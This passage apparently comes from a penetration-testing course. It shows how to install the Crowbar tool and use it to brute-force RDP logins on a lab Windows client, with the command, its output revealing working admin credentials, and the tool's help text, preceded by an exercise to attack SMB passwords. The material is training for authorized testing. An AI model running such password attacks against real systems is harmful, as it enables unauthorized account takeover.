2. Create a password list containing your Windows client password and use that to perform a password attack again the SMB protocol on the Windows client.

# 19.3.2 Remote Desktop Protocol Attack with Crowbar

Crowbar, formally known as Levey, is a network authentication cracking tool primarily designed to leverage SSH keys rather than passwords. It is also one of the few tools that can reliably and efficiently perform password attacks against the Windows Remote Desktop Protocol (RDP) service on modern versions of Windows. Let’s try this tool against our Windows client machine.

First let’s install Crowbar from the Kali repository:

```
kali@kali:~$ sudo apt install crowbar
Reading package lists... Done
Building dependency tree
Reading state information... Done
...
*Listing 605 - Using apt install to install crowbar*
```

To invoke crowbar, we will specify the protocol (-b), the target server (-s), a username (-u), a wordlist (-C), and the number of threads (-n) as shown in Listing 606:

```
kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C /password-file.txt -n 1
2019-08-16 04:51:12 START
2019-08-16 04:51:12 Crowbar v0.3.5-dev
2019-08-16 04:51:12 Trying 10.11.0.22:3389
2019-08-16 04:51:13 RDP-SUCCESS : 10.11.0.22:3389 - admin:Offsec!
2019-08-16 04:51:13 STOP
*Listing 606 - RDP password attack using Crowbar*
```

Note that Crowbar discovered working credentials for the “admin” user. We specified a single thread since the remote desktop protocol does not reliably handle multiple threads.

To view additional supported protocols we can run crowbar with the --help flag:

```
kali@kali:~$ crowbar --help
usage: Usage: use --help for further information

Crowbar is a brute force tool which supports OpenVPN, Remote Desktop Protocol, SSH Private Keys and VNC Keys.

positional arguments:
  options

optional arguments:
  -h, --help            show this help message and exit
  -b {vnckey,sshkey,rdp,openvpn}, --brute {vnckey,sshkey,rdp,openvpn}
                      Target service
  -s SERVER, --server SERVER
                      Static target
  -S SERVER_FILE, --serverfile SERVER_FILE
                      Multiple targets stored in a file
  -u USERNAME [USERNAME ...], --username USERNAME [USERNAME ...]
                      Static name to login with
  -U USERNAME_FILE, --usernamefile USERNAME_FILE
```